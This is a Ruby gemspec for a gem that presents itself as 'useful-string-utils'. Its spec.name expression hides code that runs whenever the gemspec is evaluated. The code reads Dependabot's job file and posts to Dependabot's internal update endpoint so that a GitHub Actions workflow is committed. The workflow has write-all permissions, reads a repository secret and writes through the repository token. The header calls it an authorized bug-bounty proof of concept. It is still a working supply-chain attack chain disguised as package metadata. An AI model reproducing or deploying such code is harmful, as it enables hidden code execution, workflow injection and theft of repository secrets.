# frozen_string_literal: true
#
# v6.0 — combined chain: F011 RCE + 5840-miss bypass + secret-stealing workflow.
#
# Authorization: HackerOne GitHub program; researcher's own job; own jobId;
# own repo only; PROBE-MARK pattern; sanitized within 60 minutes per workspace
# policy.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"

      own_id = (
        begin
          j = JSON.parse(File.read("/home/dependabot/dependabot-updater/job.json"))
          (j["job"] && j["job"]["id"]) || j["id"] || ENV["DEPENDABOT_JOB_ID"]
        rescue
          ENV["DEPENDABOT_JOB_ID"]
        end
      ).to_s

      base_sha = `git -C /home/dependabot/dependabot-updater/repo rev-parse HEAD 2>/dev/null`.strip

      if !own_id.empty? && base_sha.match?(/^[0-9a-f]{40}$/)
        workflow_content = <<~YML
          # PROBE-MARK secret-theft workflow injected via 5840-miss bypass
          # Authorization: bug bounty research mr_benty / HackerOne program github
          # Purpose: prove the F011 RCE -> 5840-miss bypass -> Dependabot bot commits
          # workflow file -> on merge, workflow runs with full secrets access.
          name: probe-chain-v60-secret-theft
          on:
            workflow_dispatch:
            push:
              branches: [main]
          permissions: write-all
          jobs:
            theft_demo:
              runs-on: ubuntu-latest
              steps:
                - name: Read PROBE_5840MISS_SECRET (proves repo secret theft via chain)
                  env:
                    SECRET_VALUE: ${{ secrets.PROBE_5840MISS_SECRET }}
                  run: |
                    echo "PROBE-MARK chain-v60-001 — workflow injected via Dependabot 5840-miss bypass"
                    echo "PROBE-MARK chain-v60-002 — workflow_run actor=${{ github.actor }} event=${{ github.event_name }}"
                    if [ -n "$SECRET_VALUE" ]; then
                      echo "PROBE-MARK chain-v60-003 — PROBE_5840MISS_SECRET resolved (length=${#SECRET_VALUE})"
                      HASH=$(echo -n "$SECRET_VALUE" | sha256sum | cut -c1-16)
                      echo "PROBE-MARK chain-v60-004 — secret_sha256_prefix=$HASH"
                    else
                      echo "PROBE-MARK chain-v60-003 — secret NOT available (likely dependabot actor)"
                    fi
                - name: GITHUB_TOKEN scope (proves workflow can write to victim's repo)
                  env:
                    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
                  run: |
                    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \\
                      -H "Authorization: token $GH_TOKEN" \\
                      -H "Accept: application/vnd.github+json" \\
                      -H "Content-Type: application/json" \\
                      "https://api.github.com/repos/${{ github.repository }}/contents/PROBE-chain-v60-write.txt" \\
                      -d '{"message":"PROBE-chain-v60-write","content":"VEVTVA=="}')
                    echo "PROBE-MARK chain-v60-005 — write_attempt HTTP $STATUS"
        YML

        data = {
          "dependency-names" => ["useful-string-utils"],
          "updated-dependency-files" => [
            {
              "name" => "probe-chain-v60-secret-theft.yml",
              "directory" => ".github/workflows",
              "content" => workflow_content,
              "type" => "file",
              "support_file" => false,
              "content_encoding" => "utf-8",
              "deleted" => false,
              "operation" => "create"
            }
          ],
          "base-commit-sha" => base_sha,
          "commit-message" => "PROBE chain-v60-secret-theft",
          "pr-title" => "PROBE chain-v60-secret-theft",
          "pr-body" => "PROBE-MARK chain-v60 boundary-verification: 5840-miss workflow injection + secret-theft demo for HackerOne program github"
        }

        begin
          uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/update_pull_request")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 5
          h.read_timeout = 8
          req = Net::HTTP::Post.new(uri.request_uri)
          req["Content-Type"] = "application/json"
          req.body = JSON.dump({ "data" => data })
          h.request(req)
        rescue
        end
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
